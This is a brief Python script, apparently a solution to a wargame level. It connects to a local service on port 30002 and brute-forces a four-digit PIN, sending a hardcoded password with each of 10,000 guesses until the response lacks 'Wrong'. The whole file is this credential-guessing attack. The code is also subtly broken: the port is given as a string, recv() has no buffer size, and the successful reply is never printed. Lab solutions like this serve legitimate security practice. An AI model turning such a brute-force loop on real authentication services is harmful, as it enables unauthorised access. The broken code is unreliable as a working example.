#!/usr/bin/python
import socket

s = socket.socket()
s.connect(('localhost', '30002'))
print(s.recv())

password = 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ'

for pin in range(0, 10000):
	s.sendall(password + ' ' + str(pin) + '\n')
	message = s.recv(1024)
	
	if 'Wrong' in message:
		continue
	else:
		break

s.close()
